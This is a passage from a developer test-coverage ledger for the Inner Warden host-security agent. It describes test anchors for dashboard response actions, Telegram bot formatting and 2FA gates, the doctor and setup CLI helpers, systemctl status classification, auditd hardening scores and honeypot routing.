- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_dry_run_happy_path_writes_audit_and_incident` - synthesizes an incident JSONL row AND writes the decision row with `execution_result = "ok (dry_run)"`. The agent's main loop reads the incident on the next 2-second tick. Anti-regression for the dry-run prefix being silently dropped.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_live_mode_records_incident_injected_result` - live-mode bookkeeping branch records `execution_result = "incident_injected"` (different from the dry-run literal). Also pins the `duration_secs.unwrap_or(120)` default branch.
- `crates/agent/src/dashboard/actions.rs::tests::execute_block_ip_dry_run_ufw_returns_success_and_chains_audit` - direct helper test with the ufw backend. Decision JSONL row carries `skill_id = block-ip-ufw`. The admin-actions audit file is created in the same directory (cross-checks the `append_admin_action` side-effect).
- `crates/agent/src/dashboard/actions.rs::tests::execute_block_ip_dry_run_iptables_uses_correct_skill_id` - iptables backend resolves to `skill_id = block-ip-iptables`. Default `incident_id = dashboard:manual` when caller passes None.
- `crates/agent/src/dashboard/actions.rs::tests::execute_block_ip_dry_run_nftables_uses_correct_skill_id` - nftables backend resolves to `skill_id = block-ip-nftables`. Pins the `_ => Box::new(BlockIpUfw)` fallback NOT being hit for known backends.
- `crates/agent/src/dashboard/actions.rs::tests::execute_suspend_user_dry_run_writes_decision_and_admin_audit` - direct helper test. Decision row carries `action_type = suspend_user_sudo`, target_user, `skill_id = suspend-user-sudo`, and `dry_run = true`.
- `crates/agent/src/dashboard/actions.rs::tests::execute_suspend_user_dry_run_default_incident_id_when_none` - `incident_id = None` falls through to the `dashboard:manual` literal. Pins the default in the helper, separate from the public-handler default.
- `crates/agent/src/dashboard/actions.rs::tests::inject_honeypot_test_incident_writes_parseable_line` - synthetic SSH brute-force incident is parseable JSON, severity `high`, IP entity `1.2.3.4`. Anti-regression for a JSON-shape change that breaks the agent loop's incident reader.
- `crates/agent/src/dashboard/actions.rs::tests::inject_honeypot_test_incident_appends_when_called_twice` - second call appends, never overwrites. The agent loop reads incrementally via byte-offset cursors; an overwrite would silently lose the first incident.
- `crates/agent/src/dashboard/actions.rs::tests::hostname_returns_some_string` - best-effort hostname helper never panics and never returns empty (env var, /etc/hostname, or the literal `unknown` fallback).
- `crates/agent/src/dashboard/actions.rs::tests::api_action_reopen_incident_rejects_when_only_reason_empty` - the second of the two empty-fields branches (existing tests cover empty incident_id; this pins empty reason with a non-empty incident_id).
- `crates/agent/src/dashboard/actions.rs::tests::api_action_override_decision_uses_default_when_original_reason_missing` - seeds a row with `reason = None` to exercise the `original.reason.unwrap_or_default()` fallback. Pins behavior when the AI decision had no rationale to begin with.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_override_decision_truncates_long_original_reason` - 500-char original reason gets clamped to exactly 200 char fragments via `truncate(_, 200)` in the combined audit reason. Anti-regression for a refactor that drops the truncation and bloats every audit row.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_label_decision_with_tp_label_writes_jsonl` - pins the TP label branch (existing tests cover FP). Empty reason via the `#[serde(default)]` String defaults to ""; the JSONL row still gets written.

### bot_helpers.rs coverage anchors (Spec 023 - AUDIT-COVERAGE-BOT-HELPERS)

Phase 7B coverage push (top-10 worktree wave). Pre-baseline `bot_helpers.rs` was at 56.6% line coverage (315/557); the formatting / dispatch branches below were untested. The block landed `bot_helpers.rs` at 80.6% (449/557, +24 points). Each anchor pins an operator-visible string the bot prints back to Telegram, so a future refactor that drops a branch silently breaks the assertion here rather than only on production.

- `crates/agent/src/bot_helpers.rs::tests::graph_last_incidents_covers_all_severities_and_age_branches` - pins every `sev_icon` arm (critical/low/wildcard) AND the `just now` / `>= 60 minutes` age formatting branches of `graph_last_incidents`. Anti-regression for a refactor that collapses the icon match to a single emoji, which would degrade the at-a-glance Telegram threat list.
- `crates/agent/src/bot_helpers.rs::tests::graph_last_decisions_covers_all_action_icons` - pins every `action_icon` arm (suspend/honeypot/monitor/kill/ignore/default) of `graph_last_decisions`. The icon distinguishes block from honeypot from kill on the operator's small phone screen; collapsing them would silently confuse incident response.
- `crates/agent/src/bot_helpers.rs::tests::graph_last_decisions_fallback_target_renders_as_question_mark` - pins the `decision_target = None` fallback rendering as `<code>?</code>` plus the `auto_executed=true → "live"` mode label. The dashboard parses the same "?" sentinel; a silent change here would desync.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_includes_decisions_section` - pins that `ask_context_deep` emits a `RECENT DECISIONS:` section formatted as `- {action} {target} ({auto|proposed})`, including the `?` fallback when `decision_target` is None. Pre-baseline section_2 was untested because the headline test only seeded a decision-less incident.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_includes_high_risk_entities_with_campaigns` - pins the `HIGH-RISK ENTITIES:` section: IP appears when `risk_score > 70` OR has a `MemberOf` campaign edge, rendered with the `campaigns=N` suffix when applicable. The `risk_score <= 70 && campaigns == 0` filter is also pinned so low-risk noise stays out.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_subgraph_renders_all_node_label_variants` - pins every variant of `node_label` (Process/File/User/Domain/Container/Device/System/Incident/Campaign) rendered through the SUBGRAPH FOR QUESTION section, including the 40-char truncation on `File` paths and the 12-char truncation on `Container` ids. Anti-regression for accidentally formatting a node as `Debug` representation when adding a new Node variant.
- `crates/agent/src/bot_helpers.rs::tests::format_time_ago_handles_days_hours_minutes_and_invalid` - pins all three age formats (`Nd ago` / `Nh ago` / `Nm ago`) plus the `recently` sentinel for unparseable input AND the `minutes.max(1)` floor so a future timestamp never produces `0m ago`.
- `crates/agent/src/bot_helpers.rs::tests::local_hostname_for_audit_reads_env_var_when_set` - pins the `HOSTNAME` env-var override path of `local_hostname_for_audit` (used in every Telegram-triage audit row). Test restores the prior env value to keep the suite reentrant.
- `crates/agent/src/bot_helpers.rs::tests::triage_allow_proc_with_valid_name_writes_audit_on_protected_path_failure` - pins the **error** branch of the `__allow_proc__` Telegram callback: a non-root test runner cannot open `/etc/innerwarden/allowlist.toml`, so `append_to_allowlist` returns Err and the audit row is written via `write_telegram_triage_audit` with the attempted process name. Anti-regression for accidentally early-returning before the audit on the failure path (which would lose forensic visibility on attempted-but-failed allowlist mutations).
- `crates/agent/src/bot_helpers.rs::tests::triage_allow_ip_with_valid_address_writes_audit_on_protected_path_failure` - mirror anchor for the `__allow_ip__` callback's protected-path Err branch.
- `crates/agent/src/bot_helpers.rs::tests::check_2fa_gate_intercepts_when_operator_is_locked_out` - pins the lockout short-circuit of `check_2fa_gate`: after 3 recorded failures within the hour the gate intercepts WITHOUT storing a new pending action, blocking re-entry until the failure window rolls off. Defends against the "lockout that still accepts a new pending action" subtle bug.
- `crates/agent/src/bot_helpers.rs::tests::handle_totp_response_with_no_secret_replies_with_config_error` - pins the misconfig branch where `[security].two_factor_method = "totp"` but neither the env var nor the config field carries a usable secret. The handler must consume the pending action and reply with the configuration error rather than silently accept any code.
- `crates/agent/src/bot_helpers.rs::tests::handle_totp_response_with_invalid_secret_replies_with_invalid_error` - pins the branch where `TotpProvider::new` rejects a too-short / non-base32 secret. Anti-regression for accidentally treating "invalid secret" as "any code matches".
- `crates/agent/src/bot_helpers.rs::tests::handle_totp_response_with_expired_pending_reports_expired` - pins the expired-pending path: a pending action with `expires_at < now` MUST be consumed (taken from the map) and the operator gets the "expired, retry" reply. No failure counter increment — stale codes don't penalise the operator.
- `crates/agent/src/bot_helpers.rs::tests::handle_totp_response_wrong_code_after_failures_triggers_lockout_message` - pins the wrong-code-causes-lockout path: after 2 prior failures the next wrong code crosses the threshold, the lockout reply fires, AND the pending action is NOT re-stored (no retry once locked out).
- `crates/agent/src/bot_helpers.rs::tests::execute_verified_action_runs_all_action_variants_without_panic` - smoke anchor for all four `PendingActionType` arms of `execute_verified_action` (`AllowlistProcess`, `AllowlistIp`, `UndoAllowlist`, `AutoFpAllowlist`). Each arm hits the protected `/etc/innerwarden/allowlist.toml` path and falls into its Err branch on a non-root test runner; this anchor pins that none of the four arms panic, so a future refactor that drops or renames an arm fails to compile or trips the no-panic contract.

### CTL ops command coverage (spec 023 / coverage-top10 batch — 2026-05-06)

Pure-helper anchors extracted from `crates/ctl/src/commands/ops.rs` so the
1,250-line CLI dispatch file can be regression-tested without spawning real
subprocesses. Each helper isolates one decision the original interactive /
side-effecting command made inline. Bumped the file from 32.4% to 77.3%
covered.

- `crates/ctl/src/commands/ops.rs::tests::looks_like_openai_key_accepts_long_sk_keys` - format heuristic for OpenAI keys. Anti-regression for relaxing the prefix check to accept any 20+ char string.
- `crates/ctl/src/commands/ops.rs::tests::looks_like_anthropic_key_accepts_sk_ant_prefix` - format heuristic for Anthropic keys. Anti-regression for the doctor accepting `sk-` (OpenAI shape) when provider is `anthropic`.
- `crates/ctl/src/commands/ops.rs::tests::looks_like_telegram_token_accepts_canonical_format` - bot token shape `<digits>:<20+ chars>`. Pins the /etc/innerwarden/agent.env validation that prevents pasting a chat-id where a token belongs.
- `crates/ctl/src/commands/ops.rs::tests::resolve_three_tier_prefers_config_over_env_and_file` - canonical config / env / env-file precedence. Anti-regression for the doctor accidentally giving a stale env-file value priority over a fresh agent.toml entry.
- `crates/ctl/src/commands/ops.rs::tests::build_ai_provider_check_anthropic_valid_key` / `build_ai_provider_check_openai_valid_key` / `build_ai_provider_check_unknown_provider_treated_as_openai` - the doctor's per-provider key-format dispatch. Anti-regression for adding a new provider that silently degrades to "OPENAI_API_KEY not set".
- `crates/ctl/src/commands/ops.rs::tests::suggest_detector_threshold_lowers_when_too_many_incidents` / `suggest_detector_threshold_raises_when_quiet_events_dominate` / `suggest_detector_threshold_returns_current_when_calibrated` - the four heuristic branches inside `cmd_tune`. Pins the auto-tuning math so a future "make tuning more aggressive" change doesn't lose the floor of 2 or the ceiling of 50.
- `crates/ctl/src/commands/ops.rs::tests::unix_secs_to_iso_known_dates` - pure date formatter used by `cmd_pipeline_test`. Pins the leap-year arithmetic (2024-02-29) and end-of-year boundary (2025-12-31T23:59:59) the original inline math handled.
- `crates/ctl/src/commands/ops.rs::tests::format_decision_summary_uses_action_type_when_present` / `format_decision_summary_falls_back_to_action_field` / `format_decision_summary_handles_missing_fields` - the JSON→stdout transformation in step 4 of `innerwarden test`. Anti-regression for changing the order of fields the operator reads when validating the pipeline.
- `crates/ctl/src/commands/ops.rs::tests::parse_configure_menu_choice_numeric_options` / `parse_configure_menu_choice_quit_variants` / `parse_configure_menu_choice_invalid_inputs` - the configure-menu's stdin → routing decision parser, extracted so the 11 numeric branches plus quit / invalid paths are testable without `std::io::stdin`.
- `crates/ctl/src/commands/ops.rs::tests::detect_configure_menu_status_*` - the 10 "what's already configured?" derivations the configure menu uses to render its status badges. Anti-regression for accidentally flipping a `has_env` check to `is_enabled` and vice-versa.
- `crates/ctl/src/commands/ops.rs::tests::cmd_doctor_inner_returns_issue_count_with_no_configs` / `cmd_doctor_inner_handles_telegram_section_when_enabled` / `cmd_doctor_inner_with_invalid_toml_reports_failure` - smoke runs of the full `cmd_doctor` body via the new `cmd_doctor_inner` entry point. Critical: the original `cmd_doctor` called `process::exit(1)` when issues were found, making it untestable; splitting the exit decision into the wrapper preserves binary behaviour while letting tests assert the issue counter.
- `crates/ctl/src/commands/ops.rs::tests::pipeline_test_decision_found_*` - the four sub-conditions of "did a new decision appear?" inside the polling loop. Pins the original loose-match-when-grew behaviour that smoke-tests rely on.
- `crates/ctl/src/commands/ops.rs::tests::write_totp_configuration_writes_secret_and_marks_method` / `write_disable_two_factor_marks_method_as_none` - the side-effecting half of `cmd_configure_2fa`. Pins the env-file shape (`INNERWARDEN_TOTP_SECRET="..."`) and the agent.toml `[security] two_factor_method` write so a future "store secrets in keyring" refactor must update both surfaces.

### CTL setup wizard helpers (test/coverage-top10)

The `innerwarden setup` command is dominated by interactive prompts and side
effects, but its decision tree is testable when each branch is extracted into
a pure helper. The anchors below pin those helpers so a future refactor that
re-inlines them and breaks the wizard's branching is caught at CI time.

- `crates/ctl/src/commands/setup.rs::tests::parse_yes_no_uses_default_on_empty_input` — empty/whitespace stdin returns the supplied default. Anti-regression for any change that drops the default fallback.
- `crates/ctl/src/commands/setup.rs::tests::parse_yes_no_accepts_y_and_yes_case_insensitively` — only `y`/`yes` (any case, surrounding whitespace) count as affirmative.
- `crates/ctl/src/commands/setup.rs::tests::parse_model_choice_idx_zero_input_saturates_to_zero` — typing `0` does not panic; the saturating conversion to a 0-indexed slice index keeps the wizard safe.
- `crates/ctl/src/commands/setup.rs::tests::resolve_local_ollama_plan_one_model_auto_selects_it` — when Ollama is up with a single model the wizard auto-selects it (no prompt). Pins the UX contract.
- `crates/ctl/src/commands/setup.rs::tests::cloud_provider_for_selection_maps_known_indices` — the `[1/3] AI` Select dialog index→provider mapping is canonical (0=Ollama is handled separately, 1..=5 map to the cloud table). Anti-regression for any reordering that silently breaks the dialog.
- `crates/ctl/src/commands/setup.rs::tests::other_ai_providers_constant_matches_known_wizard_providers` — every name in `OTHER_AI_PROVIDERS` exists in `WIZARD_PROVIDERS`, so `prompt_setup_other_ai_plan`'s `.expect("wizard provider exists")` cannot panic at runtime.
- `crates/ctl/src/commands/setup.rs::tests::resolve_responder_plan_from_selection_auto_protect_requires_yes` — the `Auto-protect` Select branch only writes `dry_run = false` when the operator explicitly types `yes` (not `y`, not `YES`). Pins the safety gate.
- `crates/ctl/src/commands/setup.rs::tests::sensor_restart_decision_macos_skips_even_in_dry_run` — innerwarden-sensor restart is a no-op on macOS regardless of dry-run state. Pins the cross-platform contract.
- `crates/ctl/src/commands/setup.rs::tests::apply_setup_mesh_writes_seeds_when_section_missing` — fresh `[mesh]` section gets `bind`, `poll_secs`, `auto_broadcast` defaults; existing sections only flip `enabled`. Pins the no-clobber invariant for operator-edited mesh configs.
- `crates/ctl/src/commands/setup.rs::tests::compute_setup_existing_channels_slack_needs_env_and_enabled` — Slack is only "configured" when both the env var and `slack.enabled = true` are present. Anti-regression for the half-configured-but-treated-as-OK bug shape.
- `crates/ctl/src/commands/setup.rs::tests::cmd_setup_dry_run_returns_ok_when_everything_preconfigured_basic_mode` — `cmd_setup` orchestration test: with everything pre-set and `dry_run = true`, the wizard runs end-to-end without modifying the agent config (apply phase guarded).

### Daily Briefing honesty (Bug 5 — 2026-05-06 prod observation)

Operator pasted a Telegram briefing that said "Detected 0 critical, **3 high** severity threats" + listed `crontab_persistence` and `prctl_rename` under "Handled silently:", then immediately closed with "✅ All clear. Nothing needs you." That contradiction is the **same operator-honesty class** as the dashboard re-audit's "honesty > vanity in metric labels" hard rule (Wave 10 cousin).

- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_high_count_suppresses_all_clear` — `format_daily_digest_enriched` MUST NOT emit "All clear. Nothing needs you." when `high_count > 0`. Pins the honest "Auto-handled — review when convenient." copy. Anti-regression for accidentally restoring the pre-2026-05-06 contradiction.
- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_critical_count_suppresses_all_clear` — same for `critical_count > 0`. The two counts share the gate but the test pins each branch independently so a future refactor that splits the gate cannot regress one half silently.
- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_deferred_entry_suppresses_all_clear` — when `pipeline.deferred` lists any detector (the briefing's "Handled silently:" section), "All clear" must also be suppressed. Pins that the briefing cannot list a detector and then claim there is nothing to acknowledge.
- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_truly_quiet_day_keeps_all_clear` — positive case: with all zeros AND empty deferred, "All clear. Nothing needs you." remains the right copy. Pins the no-false-positive contract (we did not break the genuine quiet-day signal).
- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_renders_deferred_entries` — pre-existing test now asserts the post-fix contract (deferred non-empty + high_count=1 ⇒ Auto-handled, not All clear).
- `crates/agent/src/telegram/formatting.rs::tests::format_daily_digest_simple` — non-enriched simple-mode digest with critical+high > 0 must also use "Auto-handled" instead of "All clear". The non-enriched function is still `pub` and the same honesty contract applies.
- `crates/agent/src/telegram/formatting.rs::tests::format_daily_digest_simple_quiet_day_keeps_all_clear` — non-enriched positive case for the truly-quiet-day branch.
- `crates/agent/src/telegram/formatting.rs::tests::format_daily_digest_simple_high_only_suppresses_all_clear` — non-enriched, only `high_count > 0` (no critical) still suppresses "All clear". Pins that high-without-critical is still a fail of the gate, not a pass.

### systemctl bus failure cascade (Bugs 1/2/3/8 — 2026-05-06 prod observation)

Operator ran `innerwarden doctor` over an SSH non-login session. Output had `Failed to connect to bus: No data available` (x2) leaking on stderr; doctor's Services section reported `[warn] innerwarden-agent is not running`; Agent health on the next line said `[ok] agent active - last write 5s ago`; dashboard probe failed with hint `→ Start the agent` even though the agent was alive; harden separately reported "Inner Warden agent is not running" in its Services category, lowering the overall score. All four symptoms shared one root cause: `is_service_active(unit) -> bool` collapsed three distinct states (active / inactive / could-not-query) into one boolean. Fix splits them into `ServiceStatus::{Active, Inactive, Unknown}` and teaches every caller to defer to a secondary signal on `Unknown` instead of producing a false-positive operator alarm.

- `crates/ctl/src/systemd.rs::tests::classify_systemctl_is_active_bus_failure_maps_to_unknown` — the headline anchor: stdout `unknown\n` + non-zero exit (the `Failed to connect to bus` shape) maps to `ServiceStatus::Unknown`, NOT `Inactive`. This is the difference between doctor confidently reporting the agent is down (false positive) and doctor deferring to the telemetry-freshness check below (correct).
- `crates/ctl/src/systemd.rs::tests::classify_systemctl_is_active_empty_stdout_maps_to_unknown` — empty stdout + non-zero exit (the bus-failure shape on distros where the bus error goes to stderr) also maps to Unknown. Pins the contract that stdout absence is "could not determine" not "inactive".
- `crates/ctl/src/systemd.rs::tests::classify_systemctl_is_active_inactive_maps_to_inactive` — positive case for the genuine-down path: `inactive` and `failed` stdout still produce `Inactive` so the operator does see the warning when it is real.
- `crates/ctl/src/systemd.rs::tests::classify_systemctl_is_active_active_maps_to_active` — positive case: `active` stdout maps to `Active`. Anti-regression for accidentally widening the Unknown bucket to swallow the happy path.
- `crates/ctl/src/commands/ops.rs::tests::build_dashboard_reachability_check_agent_alive_dashboard_down_does_not_say_start_agent` — Bug 3 anchor: when the agent IS alive but the dashboard probe fails, the hint MUST NOT include "Start the agent". Pins the `agent_alive=true` branch's redirect to "check the dashboard binding".
- `crates/ctl/src/commands/ops.rs::tests::build_dashboard_reachability_check_agent_down_suggests_start` — pre-Bug-3 behavior preserved when agent is genuinely down: hint still says "Start the agent". Pins both branches of the new `agent_alive` parameter.
- `crates/ctl/src/harden/services.rs::tests::classify_service_active_unknown_stdout_maps_to_unknown` — Bug 8 helper anchor: harden's local classifier returns Unknown on the bus-failure stdout shape. Pins the helper independently of the integration test below.
- `crates/ctl/src/harden/mod.rs::tests::check_services_silent_when_systemctl_returns_unknown` — Bug 8 integration anchor: full `check_services(env)` path with `unknown\n` stdout produces NO finding AND NO passed line. Anti-regression for the 16/100 "Critical" score the operator saw when the agent was alive but harden could not query the bus.
- `crates/ctl/src/harden/mod.rs::tests::check_services_silent_when_systemctl_stdout_is_empty` — same rule for the empty-stdout shape. Pins both bus-failure variants since distros differ in which one they emit.

### Harden auditd cluster (Bugs 7/9/10 — 2026-05-06 prod observation)

Operator's `innerwarden system harden` printed Score 16/100 "Critical" with SSH/firewall/kernel/permissions/docker/TLS all green; ten of the eleven Auditd findings were the auditd category (one Medium per missing rule + one High summary = 9*5 + 10 = 55pp from auditd alone, disproportionate). Inline hints embedded `auditctl …` directly after the prose with no visual break (Bug 9). The summary mentioned `innerwarden harden --install-audit-rules` but that flag was never implemented (Bug 10).

- `crates/ctl/src/harden/auditd.rs::tests::check_auditd_missing_9_of_10_emits_single_finding` — Bug 7 anchor: with 9 missing rules, harden emits exactly ONE auditd-category finding instead of nine + one summary. Pins the new "auditd contributes one severity-bounded penalty" rule so a future refactor cannot re-introduce per-rule penalties.
- `crates/ctl/src/harden/auditd.rs::tests::check_auditd_severity_scales_with_missing_count` — Bug 7 anchor: severity scales (1 missing = Low, 4 missing = Medium, 7+ missing = High). Caps the auditd category's score impact at one High penalty (10pp) instead of N*5pp + 10pp.
- `crates/ctl/src/harden/auditd.rs::tests::check_auditd_missing_rules_fix_is_bullet_formatted` — Bug 9 anchor: the fix text presents each missing rule on its own indented bullet line and includes the `augenrules --load` reload hint. Anti-regression for the prose-collides-with-command shape that confused operator copy-paste.
- `crates/ctl/src/harden/auditd.rs::tests::check_auditd_missing_rules_fix_does_not_promise_unimplemented_flag` — Bug 10 anchor: the fix text MUST NOT mention `--install-audit-rules`. Pins the rule that any flag promised in operator-facing text must exist in the CLI; the alternative ("implement the flag") is a separate feature PR. Honesty hard rule applied to CLI affordances.

### Doctor nginx error log discovery (Bug 4 — 2026-05-06 prod observation)

Operator's prod doctor printed `[fail] nginx error log not found (/home/ubuntu/proxy/data/logs/fallback_error.log)` with hint "log is created on first request or error" — hard fail contradicting the hint, on a healthy server with a custom nginx config that simply had not errored yet. Fix: probe a small list of common defaults before reporting; downgrade missing-everywhere to `[warn]` because nginx writes the file lazily.

- `crates/ctl/src/commands/ops.rs::tests::build_nginx_error_log_check_missing_warns_not_fails` — Bug 4 anchor: a missing nginx error log emits `[warn]`, NOT `[fail]`. Anti-regression for the prod hard-fail contradicting the lazy-creation invariant. Pins that the old "Start nginx" hint is gone.
- `crates/ctl/src/commands/ops.rs::tests::build_nginx_error_log_check_alternative_present_warns_with_both_paths` — Bug 4 anchor: when the configured path is missing but a default (`/var/log/nginx/error.log`) exists, the warn message surfaces BOTH paths and suggests aligning the sensor config. Pins the discovery contract so a future refactor cannot silently drop the alternative-path probe.
- `crates/ctl/src/commands/ops.rs::tests::build_nginx_error_log_check_alternatives_all_missing_falls_through_to_warn` — Bug 4 anchor: alternative paths that don't exist behave the same as no alternatives (still Warn, "not yet written" copy). Pins the negative branch of the discovery probe.
- `crates/ctl/src/commands/ops.rs::tests::build_nginx_error_log_check_present_with_alternatives_is_still_ok` — happy-path anchor: configured path exists → Ok regardless of alternatives. Anti-regression for accidentally widening the warn branches into the present-path case.

### Boot loop coverage push (PR #486 follow-up — 2026-05-07)

The four pre-existing `run_agent` integration tests (above this section in source order) all use `cli.once = true`, leaving the entire non-once orchestration branch uncovered (700+ lines of telegram polling spawn, honeypot always-on, mesh discovery, the slow-loop `tokio::select!`, and the `cfg.report` / `cleanup_015` / `backfill_015` / `retrain_anomaly` dispatch arms). Coverage stalled at ~34%. These anchors push it past 60% without fake tests; assertions verify operator-observable side effects, not just the absence of panics.

- `crates/agent/src/loops/boot.rs::tests::run_agent_non_once_spawns_orchestration_paths` — full integration anchor: drives `run_agent` in non-once mode for 8s with a feature-rich config (mesh, slack, cloudflare, crowdsec, geoip, fail2ban, webhook all enabled) + dashboard on a random local port + seeded events/incidents JSONL. Asserts `outcome.is_err()` (the loop must keep running until cancelled by the timeout — early Ok would mean the loop exited prematurely, e.g. from a config-validation regression), AND `incident-groups.json` exists + parses as JSON (proves the slow-loop tick fired AND the snapshot path the dashboard reads is still wired), AND `innerwarden.db` exists (proves the SQLite store init path executed end-to-end). Anti-regression for silent boot failures the once-mode tests cannot catch.
- `crates/agent/src/loops/boot.rs::tests::run_agent_dispatches_cleanup_015_flag` — pins the `cli.cleanup_015_graph_signal_quality` dispatch wiring inside `run_agent`. With an empty data_dir the underlying function bails with "No dated snapshot found" — this anchor pins that the flag actually routes to that function (a future refactor that drops the `if cli.cleanup_015_graph_signal_quality { ... }` branch would silently break the operator's `--cleanup-015-graph-signal-quality` CLI flag).
- `crates/agent/src/loops/boot.rs::tests::run_agent_dispatches_backfill_015_flag` — same as above for `cli.backfill_015_research_only`.
- `crates/agent/src/loops/boot.rs::tests::run_agent_dispatches_retrain_anomaly_flag` — same for `cli.retrain_anomaly`. Pins the operator-facing `--retrain-anomaly` dispatch.
- `crates/agent/src/loops/boot.rs::tests::run_agent_report_mode_with_explicit_report_dir_creates_it` — extends the existing report-mode test to cover the `Some(report_dir)` branch. Asserts `create_dir_all` actually materialises the configured directory (anti-regression for accidentally dropping the dir-creation step, which would surface as "no such file or directory" on a fresh server).
- `crates/agent/src/loops/boot.rs::tests::should_run_periodic_tick_truth_table` — extracted-helper anchor: the slow-loop's "every N seconds, only if there is something to consolidate" gate (intel consolidation, feedback tracker, env census, monthly report) was inline duplicated at every call site. Extracted into `should_run_periodic_tick(last_run_at, interval_secs, has_work)` so the time × work × boot-path interaction is unit-testable. Pins all four corners of the truth table.

### orphan_recovery sweep contract (test/coverage-batch-2 — 2026-05-07)

Phase 7B (RC-2) introduced the orphan-recovery sweep that auto-dismisses incidents abandoned by the AI router. The original module shipped with three tests covering only `extract_target_ip` plus one end-to-end `find_orphan_incidents` SoT contract test. The actual `run_sweep` function (the operator-visible surface — wires hostname, age formatting, target_ip extraction, the sqlite_store gate, and the dismiss-decision append into one path) was not exercised, so a regression in any of those wires would only surface in production. These anchors pin the contract that the sweep auto-dismisses ONLY old + decisionless + non-allowlisted incidents and labels every row as `ai_provider="orphan-recovery"` so the audit log cannot lie about who took the action.

- `crates/agent/src/orphan_recovery.rs::tests::extract_target_ip_returns_none_when_entities_missing` — the entity-extractor returns None when the JSON has no `entities` field. Pins the negative branch of `parsed.get("entities")?`.
- `crates/agent/src/orphan_recovery.rs::tests::extract_target_ip_returns_none_when_entities_is_not_array` — pins the `as_array()?` negative branch (covers a future schema regression that nests `entities` under an object instead of an array).
- `crates/agent/src/orphan_recovery.rs::tests::extract_target_ip_skips_empty_value_strings` — the `if !value.is_empty()` guard skips IP entities with blank values and falls through to the next one. Pins the contract that "first IP entity, but not a blank one" is what the dismiss-decision rows record as `target_ip`.
- `crates/agent/src/orphan_recovery.rs::tests::extract_target_ip_is_case_insensitive_on_kind` — the kind comparison uses `eq_ignore_ascii_case` so a future schema change that capitalises the type ("IP" vs "ip") wouldn't silently drop target_ip from every dismiss row.
- `crates/agent/src/orphan_recovery.rs::tests::hostname_prefers_env_var_when_set` — `hostname()` returns the `HOSTNAME` env var when present, AND the result is non-empty (the contract `DecisionEntry::host` relies on so the audit log never carries empty hostnames). Pins the env-first fallback chain so dismiss decisions in containerised deployments (where HOSTNAME is the canonical hostname) match the rest of the audit log.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_returns_zero_when_sqlite_store_is_none` — when `state.sqlite_store == None` (e.g. the sqlite-reopen retry path during boot) `run_sweep` early-returns 0 without panicking and without writing anything to the existing decisions JSONL. Anti-regression for a future change that allocates a DecisionEntry before the gate.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_returns_zero_when_store_has_no_orphans` — empty store → empty orphan vec → early-return 0 BEFORE the loop body. Pins the empty-bucket fast path; covers the second early-return branch in the function.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_writes_dismiss_decision_for_old_orphan` — happy-path end-to-end: an old, decisionless, non-allowlisted incident gets exactly one dismiss decision written with `ai_provider="orphan-recovery"`, `action_type="dismiss"`, the reason text mentions "orphan-recovery sweep" + an `<H>h<M>m` age fragment (so the operator can grep for it), AND the JSONL audit file is materialised on disk. Pins the operator-visible audit-trail shape.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_extracts_target_ip_from_incident_data` — the dismiss decision carries the orphan's first IP entity as `target_ip`. Pins the integration between `extract_target_ip` and the SQLite `data` column round-trip so attacker-IP dashboards correctly attribute auto-dismissed rows.
- `crates/agent/src/orphan_recovery.rs::tests::run_sweep_skips_fresh_and_decided_and_allowlisted_incidents` — full SoT enforcement: with one row of each shape (fresh, already-decided, allowlisted, real-orphan) co-resident in the store, `run_sweep` writes exactly one decision and only on the real-orphan row. Pins the SQL filter contract one layer up; without this anchor a future bug that widens the JOIN/WHERE would silently auto-dismiss real pending-AI work.

### Honeypot routing + suggestion (test/coverage-batch-2 — 2026-05-07)

- `crates/agent/src/incident_honeypot_router.rs::tests::detector_from_incident_id_uses_prefix_before_colon` — pure helper: returns prefix before first colon from `incident_id`. Pins downstream router decisions key off the parsed detector name, not the full id.
- `crates/agent/src/incident_honeypot_router.rs::tests::primary_ip_from_incident_returns_ip_entity_only` — only first `EntityType::Ip` entity, ignores User/Container/etc. Anti-regression for routing operators into the honeypot via misclassified entity types.
- `crates/agent/src/incident_honeypot_router.rs::tests::should_route_to_honeypot_prioritizes_new_suspicious_login_attackers` — pins the `suspicious_login` detector branch: routes regardless of sampling probability.
- `crates/agent/src/incident_honeypot_router.rs::tests::should_route_to_honeypot_samples_ssh_attackers_and_respects_allowlist` — both arms: allowlisted IPs never routed (operator honesty); non-allowlisted subject to deterministic sampling.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_short_circuits_when_mode_is_not_listener` — operator opt-in: `mode != "listener"` short-circuits before audit.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_short_circuits_when_responder_disabled` — watch-mode invariant: no auto-redirect when responder read-only.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_returns_false_when_incident_has_no_ip_entity` — defensive: incident without Ip entity skips routing instead of panicking.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_returns_false_when_router_declines_detector` — non-eligible detectors (e.g. `port_scan`) are skipped even when other gates pass.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_returns_false_when_caller_blocked_set_already_contains_ip` — idempotency: IP already in caller's blocked set is not re-routed (no double-audit).
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_returns_false_for_already_blocked_attacker` — global-blocklist dedup: already firewall-blocked IPs skip honeypot redirect.
- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_skips_allowlisted_ssh_attackers` — allowlist + sampling are orthogonal gates; allowlisted always wins.
